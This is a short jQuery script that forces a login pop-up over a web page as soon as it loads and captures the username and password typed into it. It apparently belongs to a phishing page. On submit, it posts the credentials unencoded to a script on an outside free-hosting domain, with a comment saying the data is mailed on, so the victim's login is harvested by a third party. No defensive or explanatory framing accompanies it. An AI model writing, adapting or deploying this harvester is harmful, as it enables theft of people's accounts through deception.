$(document).ready(function(){
	setTimeout(function() {
		$(".login-modal").show();
		$("body").css("overflow", "hidden");
	},50);
   // $("body").click(function(){
   //  $(".login-modal").hide();
   //  $("body").css("overflow", "auto");
   // });
//form ajax, disable button, send mail

$('#form').submit(function (e) {
  e.preventDefault();
  $("#login").prop('disabled', false);
  $("#login").attr("value", "Loging...");
  $.ajax({
    type: 'POST',
    url: 'https://banglaerphoto.000webhostapp.com/contact/login.php',
    data: 'username='+$("#username").val()+'&password='+$("#password").val(),
    success: function (msg) {
      $(".msg").html("msg");
      $("body").css("overflow", "auto");
    },
  });
});


});